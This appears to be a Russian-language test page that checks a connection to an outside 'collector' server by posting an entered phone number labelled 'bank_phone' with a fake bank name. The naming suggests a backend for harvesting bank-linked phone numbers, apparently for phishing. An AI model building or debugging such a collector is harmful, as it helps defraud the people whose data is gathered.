<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Тест сервера</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            max-width: 400px;
            margin: 0 auto;
        }
        input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            margin-bottom: 10px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #c9a44b;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        #log {
            margin-top: 20px;
            background: #1e1e2f;
            color: #f0f0f0;
            padding: 14px;
            border-radius: 8px;
            font-size: 13px;
            white-space: pre-wrap;
            word-break: break-all;
            line-height: 1.6;
        }
        .success { color: #10b981; }
        .error { color: #ef4444; }
        .info { color: #fabe3c; }
    </style>
</head>
<body>
    <h2>Тест связи с сервером</h2>
    <input type="tel" id="phone" placeholder="9001234567">
    <button onclick="test()">Отправить на сервер</button>
    <div id="log">Ожидание...</div>

    <script>
        const SERVER_URL = 'https://collector-bh3t.onrender.com/api/collect';

        async function test() {
            const log = document.getElementById('log');
            const phone = document.getElementById('phone').value;
            
            log.innerHTML = '<span class="info">⏳ Отправка запроса...</span>\n';
            log.innerHTML += '<span class="info">📡 URL: ' + SERVER_URL + '</span>\n';
            log.innerHTML += '<span class="info">📦 Данные: ' + JSON.stringify({ phone: '+7' + phone, type: 'bank_phone' }) + '</span>\n';
            log.innerHTML += '<span class="info">---</span>\n';
            
            try {
                const response = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'bank_phone',
                        phone: '+7' + phone,
                        bank: 'test',
                        bankName: 'Тестовый банк',
                        timestamp: new Date().toISOString()
                    })
                });
                
                log.innerHTML += '<span class="success">✅ Ответ получен</span>\n';
                log.innerHTML += '<span class="success">📊 Статус HTTP: ' + response.status + ' ' + response.statusText + '</span>\n';
                
                const result = await response.json();
                log.innerHTML += '<span class="success">📋 Ответ сервера: ' + JSON.stringify(result) + '</span>\n';
                log.innerHTML += '\n<span class="success">🎉 СВЯЗЬ РАБОТАЕТ! Данные ушли на сервер.</span>';
            } catch (e) {
                log.innerHTML += '<span class="error">❌ ОШИБКА</span>\n';
                log.innerHTML += '<span class="error">📛 Тип: ' + e.name + '</span>\n';
                log.innerHTML += '<span class="error">💬 Сообщение: ' + e.message + '</span>\n';
                
                if (e.message === 'Failed to fetch') {
                    log.innerHTML += '\n<span class="error">🔍 ПРИЧИНА: Сервер недоступен или блокирует запрос.</span>\n';
                    log.innerHTML += '<span class="error">📌 Возможные проблемы:</span>\n';
                    log.innerHTML += '<span class="error">  1. Сервер Render "уснул" (бесплатный тариф) — подождите 30-60 секунд и повторите</span>\n';
                    log.innerHTML += '<span class="error">  2. CORS-блокировка — сервер не разрешает запросы с GitHub Pages</span>\n';
                    log.innerHTML += '<span class="error">  3. Сервер не запущен — проверьте статус на Render.com</span>\n';
                } else if (e.name === 'TypeError') {
                    log.innerHTML += '\n<span class="error">🔍 ПРИЧИНА: Проблема с сетью или CORS.</span>\n';
                }
            }
        }
    </script>
</body>
</html>
